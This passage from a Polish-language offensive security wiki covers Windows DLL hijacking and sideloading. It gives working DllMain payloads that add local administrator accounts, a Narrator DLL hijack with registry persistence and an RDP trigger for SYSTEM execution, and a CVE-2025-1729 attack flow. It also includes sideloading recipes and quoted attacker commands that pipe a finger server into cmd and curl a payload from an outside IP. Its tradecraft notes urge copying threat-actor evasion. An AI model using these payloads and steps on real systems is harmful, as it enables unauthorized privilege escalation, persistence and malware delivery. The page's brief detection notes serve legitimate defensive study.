BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna biblioteka DLL w C z punktem wejścia wątku</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: Hijack DLL lokalizacji Narrator OneCore TTS (Accessibility/ATs)

Windows Narrator.exe nadal podczas uruchamiania sprawdza przewidywalną, zależną od języka bibliotekę DLL lokalizacji, którą można przejąć w celu wykonania dowolnego kodu i uzyskania persistence.<sup>[[7]](#references)</sup>

Najważniejsze fakty
- Ścieżka sprawdzana (aktualne buildy): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Starsza ścieżka (starsze buildy): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli pod ścieżką OneCore znajduje się zapisywalna, kontrolowana przez atakującego biblioteka DLL, zostaje załadowana, a `DllMain(DLL_PROCESS_ATTACH)` zostaje wykonana. Eksporty nie są wymagane.

Wykrywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` oraz `Operation is Load Image` lub `CreateFile`.
- Uruchom Narrator i zaobserwuj próbę załadowania powyższej ścieżki.

Minimalna biblioteka DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Cisza OPSEC
- Naiwny hijack będzie mówił/podświetlał UI. Aby zachować ciszę, podczas attach wylicz wątki Narrator, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wstrzymaj go za pomocą `SuspendThread`; kontynuuj działanie we własnym wątku. Pełny kod znajdziesz w PoC.<sup>[[8]](#references)</sup>

Trigger i persistence przez konfigurację Accessibility
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Powyższa konfiguracja powoduje, że uruchomienie Narrator ładuje wszczepioną DLL. Na secure desktop (ekranie logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; Twoja DLL wykona się jako SYSTEM na secure desktop.

Wykonanie SYSTEM wywołane przez RDP (lateral movement)
- Zezwól na classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się z hostem przez RDP, na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; Twoja DLL wykona się jako SYSTEM na secure desktop.
- Wykonanie zatrzymuje się po zamknięciu sesji RDP — wykonaj inject/migrate niezwłocznie.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wpis rejestru wbudowanego Accessibility Tool (AT) (np. CursorIndicator), zmodyfikować go tak, aby wskazywał na dowolny binary/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. Umożliwia to proxy arbitrary execution w ramach frameworka Accessibility.

Uwagi
- Zapis w `%windir%\System32` i zmiana wartości HKLM wymagają uprawnień administratora.
- Cała logika payloadu może znajdować się w `DLL_PROCESS_ATTACH`; eksporty nie są wymagane.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ten case study przedstawia **Phantom DLL Hijacking** w Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzony jako **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Szczegóły podatności

- **Komponent**: `TPQMAssistant.exe` znajdujący się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 w kontekście zalogowanego użytkownika.
- **Uprawnienia katalogu**: Zapisywalny przez `CREATOR OWNER`, co pozwala użytkownikom lokalnym umieszczać arbitrary files.
- **Zachowanie DLL Search**: Próbuje załadować `hostfxr.dll` najpierw z katalogu roboczego i loguje "NAME NOT FOUND", jeśli pliku brakuje, co wskazuje na pierwszeństwo wyszukiwania w katalogu lokalnym.

### Implementacja exploita

Attacker może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakującą DLL do uzyskania code execution w kontekście użytkownika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako standardowy użytkownik umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż scheduled task uruchomi się o 9:30 pod kontekstem bieżącego użytkownika.
3. Jeśli w momencie wykonania zadania zalogowany jest administrator, złośliwy DLL uruchomi się w sesji administratora ze średnim poziomem integralności.
4. Połącz standardowe techniki UAC bypass, aby podnieść uprawnienia ze średniego poziomu integralności do uprawnień SYSTEM.

## Studium przypadku: MSI CustomAction Dropper + DLL Side-Loading za pośrednictwem podpisanego hosta (wsc_proxy.exe)

Threat actors często łączą droppers oparte na MSI z DLL side-loading, aby wykonywać payloady w ramach zaufanego, podpisanego procesu.<sup>[[10]](#references)</sup>

Przegląd łańcucha
- Użytkownik pobiera MSI. CustomAction uruchamia się po cichu podczas instalacji GUI (np. LaunchApplication lub akcja VBScript), rekonstruując kolejny etap z osadzonych zasobów.
- Dropper zapisuje legalny, podpisany EXE oraz złośliwy DLL w tym samym katalogu (przykładowa para: podpisany przez Avast wsc_proxy.exe + kontrolowany przez atakującego wsc.dll).
- Po uruchomieniu podpisanego EXE Windows, zgodnie z kolejnością wyszukiwania DLL, ładuje najpierw wsc.dll z katalogu roboczego, wykonując kod atakującego w ramach podpisanego procesu nadrzędnego (ATT&CK T1574.001).

Analiza MSI (czego szukać)
- Tabela CustomAction:
- Szukaj wpisów uruchamiających pliki wykonywalne lub VBScript. Przykładowy podejrzany wzorzec: LaunchApplication wykonujący osadzony plik w tle.
- W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence i Binary.
- Osadzone/podzielone payloady w MSI CAB:
- Ekstrakcja administracyjna: msiexec /a package.msi /qb TARGETDIR=C:\out
- Możesz też użyć lessmsi: lessmsi x package.msi C:\out
- Szukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez CustomAction VBScript. Typowy przebieg:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczne sideloading z użyciem wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: legalny, podpisany host (Avast). Proces próbuje załadować wsc.dll po nazwie z własnego katalogu.
- wsc.dll: DLL atakującego. Jeśli nie są wymagane żadne konkretne eksporty, wystarczy DllMain; w przeciwnym razie zbuduj proxy DLL i przekieruj wymagane eksporty do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny payload DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- W przypadku wymagań dotyczących export użyj proxying framework (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, która jednocześnie wykonuje payload.

- Ta technika opiera się na rozwiązywaniu nazw DLL przez host binary. Jeśli host używa ścieżek absolutnych lub flag bezpiecznego ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS i forwarded exports mogą wpływać na kolejność preferencji i należy je uwzględnić podczas wyboru host binary oraz zestawu exportów.

## Podpisane triady + zaszyfrowane payloady (case study ShadowPad)

Check Point opisał, jak Ink Dragon wdraża ShadowPad za pomocą **triady trzech plików**, aby upodobnić się do legalnego software, jednocześnie utrzymując główny payload zaszyfrowany na dysku:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – wykorzystywani są dostawcy tacy jak AMD, Realtek lub NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę executable, aby wyglądał jak binary systemu Windows (na przykład `conhost.exe`), ale podpis Authenticode pozostaje ważny.
2. **Malicious loader DLL** – umieszczana obok EXE pod oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL jest zazwyczaj binary MFC obfuskowanym za pomocą frameworka ScatterBrain; jego jedynym zadaniem jest odnalezienie encrypted blob, odszyfrowanie go i reflectively map ShadowPad.
3. **Encrypted payload blob** – często przechowywany jako `<name>.tmp` w tym samym katalogu. Po memory-mapping odszyfrowanego payloadu loader usuwa plik TMP, aby zniszczyć forensic evidence.

Uwagi dotyczące tradecraft:

* Zmiana nazwy signed EXE (przy zachowaniu oryginalnej wartości `OriginalFileName` w nagłówku PE) pozwala mu udawać binary systemu Windows przy jednoczesnym zachowaniu podpisu dostawcy, dlatego warto powielać zwyczaj Ink Dragon polegający na umieszczaniu binary wyglądających jak `conhost.exe`, które w rzeczywistości są utilities AMD/NVIDIA.
* Ponieważ executable pozostaje trusted, większość mechanizmów allowlisting musi jedynie dopuścić obecność malicious DLL obok niego. Skoncentruj się na dostosowaniu loader DLL; signed parent zazwyczaj może działać bez zmian.
* Decryptor ShadowPad oczekuje, że TMP blob będzie znajdował się obok loadera i będzie zapisywalny, aby można było wyzerować plik po mapowaniu. Pozostaw katalog zapisywalny do czasu załadowania payloadu; po umieszczeniu go w pamięci plik TMP można bezpiecznie usunąć ze względów OPSEC.

### LOLBAS stager + łańcuch staged archive sideloading (finger → tar/curl → WMI)

Operators łączą DLL sideloading z LOLBAS, dzięki czemu jedynym niestandardowym artifactem na dysku jest malicious DLL umieszczona obok trusted EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Ukryty PowerShell uruchamia `cmd.exe /c`, pobiera commands z serwera Finger i przekazuje je do `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` pobiera tekst przez TCP/79; `| cmd` wykonuje odpowiedź serwera, umożliwiając operators rotowanie second stage po stronie serwera.

- **Built-in download/extract:** Pobierz archive z nieszkodliwym rozszerzeniem, rozpakuj go i przygotuj cel sideloadingu oraz DLL w losowym katalogu `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` ukrywa postęp i podąża za redirects; `tar -xf` używa wbudowanego w Windows narzędzia tar.

- **WMI/CIM launch:** Uruchom EXE przez WMI, aby telemetry pokazywała process utworzony przez CIM, podczas gdy ładuje on colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Działa z binaries, które preferują lokalne DLL (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) działa pod trusted name.

- **Hunting:** Generuj alerty dla `forfiles`, gdy `/p`, `/m` i `/c` występują razem; poza skryptami administracyjnymi jest to rzadkie.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Niedawny intrusion Lotus Blossom wykorzystywał trusted update chain do dostarczenia NSIS-packed dropper, który przygotowywał DLL sideloading oraz payloady działające w pełni in-memory.<sup>[[13]](#references)</sup>

Przebieg tradecraft
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go jako **HIDDEN**, umieszcza w nim przemianowany Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` oraz encrypted blob `BluetoothService`, a następnie uruchamia EXE.
- Host EXE importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` ładuje blob za pomocą mmap; `LogWrite` odszyfrowuje go przy użyciu custom stream opartego na LCG (stałe **0x19660D** / **0x3C6EF35F**, materiał klucza wyprowadzony z wcześniejszego hash), nadpisuje buffer plaintext shellcode, zwalnia temporary i wykonuje skok do niego.
- Aby uniknąć IAT, loader rozwiązuje APIs przez hashowanie nazw exportów przy użyciu FNV-1a basis 0x811C9DC5 + prime 0x100019, a następnie stosuje Murmur-style avalanche (**0x85EBCA6B**) i porównuje wynik z salted target hashes.

Main shellcode (Chrysalis)
- Odszyfrowuje główny module przypominający PE, wykonując add/XOR/sub z kluczem `gQ2JR&9;` w pięciu passes, a następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby dokończyć import resolution.
- Odtwarza strings nazw DLL w runtime za pomocą transformacji bit-rotate/XOR wykonywanych dla każdego znaku, a następnie ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Używa drugiego resolvera, który przechodzi przez **PEB → InMemoryOrderModuleList**, parsuje każdą export table w blokach po 4 bytes za pomocą Murmur-style mixing i korzysta z `GetProcAddress` tylko wtedy, gdy hash nie zostanie znaleziony.

Embedded configuration & C2
- Config znajduje się w upuszczonym pliku `BluetoothService` pod **offset 0x30808** (size **0x980**) i jest odszyfrowywany za pomocą RC4 z kluczem `qwhvb^435h&*7`, ujawniając C2 URL oraz User-Agent.
- Beacons budują dot-delimited host profile, poprzedzają go tagiem `4Q`, a następnie szyfrują RC4 z kluczem `vAuig34%^325hGV` przed wywołaniem `HttpSendRequestA` przez HTTPS. Responses są odszyfrowywane RC4 i przekazywane do obsługi przez tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Tryb wykonania jest kontrolowany przez CLI args: brak args = instalacja persistence (service/Run key) wskazującej na `-i`; `-i` ponownie uruchamia self z `-k`; `-k` pomija instalację i uruchamia payload.

Alternate loader observed
- Ten sam intrusion umieścił Tiny C Compiler i wykonał `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, z `libtcc.dll` obok. C source dostarczony przez atakującego zawierał embedded shellcode, który był kompilowany i uruchamiany in-memory bez zapisywania PE na dysku. Odtwórz to za pomocą:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ten etap kompilacji i uruchamiania oparty na TCC importował `Wininet.dll` w czasie wykonywania i pobierał shellcode drugiego etapu ze stałego adresu URL, zapewniając elastyczny loader, który podszywał się pod uruchomienie kompilatora.

## Signed-host sideloading with export proxying + host thread parking

Niektóre łańcuchy DLL sideloading dodają **stability engineering**, aby legalny host pozostał aktywny wystarczająco długo, by poprawnie załadować kolejne etapy, zamiast ulec awarii po załadowaniu złośliwej biblioteki DLL.<sup>[[11]](#references)</sup>

Observed pattern
- Umieść zaufany plik EXE obok złośliwej biblioteki DLL, używając oczekiwanej nazwy zależności, takiej jak `version.dll`.
- Złośliwa biblioteka DLL **proxy'uje każdy oczekiwany export** do prawdziwej systemowej biblioteki DLL (na przykład `%SystemRoot%\\System32\\version.dll`), dzięki czemu rozwiązywanie importów nadal działa, a proces hosta może kontynuować pracę.
- Po załadowaniu złośliwa biblioteka DLL **patchuje entry point hosta**, aby główny wątek wpadał w nieskończoną pętlę `Sleep`, zamiast kończyć działanie lub wykonywać ścieżki kodu, które zakończyłyby proces.
- Nowy wątek wykonuje właściwe złośliwe działania: odszyfrowuje nazwę lub ścieżkę biblioteki DLL kolejnego etapu (często używane są RC4/XOR), a następnie uruchamia ją za pomocą `LoadLibrary`.

Why this matters
- Standardowe proxying DLL zachowuje kompatybilność API, ale nie gwarantuje, że host pozostanie aktywny wystarczająco długo dla kolejnych etapów.
- Wstrzymanie głównego wątku za pomocą `Sleep(INFINITE)` to prosty sposób na utrzymanie podpisanego procesu w pamięci, podczas gdy loader wykonuje deszyfrowanie, staging lub bootstrap sieciowy w wątku roboczym.
- Polowanie wyłącznie na podejrzany `DllMain` może pominąć ten wzorzec, jeśli interesujące zachowanie następuje po spatchowaniu entry pointa hosta i uruchomieniu wątku pomocniczego.

Minimal workflow
1. Skopiuj podpisany plik EXE hosta i ustal, którą bibliotekę DLL ładuje z lokalnego katalogu.
2. Zbuduj proxy DLL eksportującą te same funkcje i przekazującą je do legalnej biblioteki DLL.
3. W `DllMain(DLL_PROCESS_ATTACH)` utwórz wątek roboczy.
4. Z tego wątku spatchuj entry point hosta lub procedurę startową głównego wątku tak, aby wykonywała pętlę na `Sleep`.
5. Odszyfruj nazwę/konfigurację biblioteki DLL kolejnego etapu i wywołaj `LoadLibrary` lub wykonaj manual-map payloadu.

Defensive pivots
- Podpisane procesy ładujące `version.dll` lub podobne często używane biblioteki z własnego katalogu aplikacji zamiast z `System32`.
- Patche pamięci w entry poincie procesu krótko po załadowaniu obrazu, szczególnie skoki/wywołania przekierowane do `Sleep`/`SleepEx`.
- Wątki tworzone przez proxy DLL, które natychmiast wywołują `LoadLibrary` dla drugiej biblioteki DLL o odszyfrowanej nazwie.
- Proxy DLL z pełnym zestawem exportów umieszczane obok plików wykonywalnych dostawcy w zapisywalnych katalogach stagingowych, takich jak `ProgramData`, `%TEMP%` lub ścieżki rozpakowanych archiwów.

## References

- [1] [Red Canary – Wnioski wywiadowcze: styczeń 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Escalation uprawnień przy użyciu TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking w Windows. Prosty przykład w C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore wdraża nowe malware wymierzone w Europę](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Gdy DLL Hijacks spotykają windowsowych helperów](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Cyfrowi sobowtórowie: Anatomia ewoluujących kampanii impersonation dystrybuujących Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zbieżne interesy: Analiza klastrów zagrożeń wymierzonych w rząd państwa Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Wewnątrz Ink Dragon: Ujawnienie sieci relay i wewnętrznego działania dyskretnej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Backdoor Chrysalis: Szczegółowa analiza toolkitu Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Śledzenie kampanii szpiegowskich Iranian APT Screening Serpens z 2026 roku](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Operacje Nimbus Manticore podczas konfliktu w Iranie](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Działania zadań](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 wymierza działania w rządy i infrastrukturę krytyczną Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
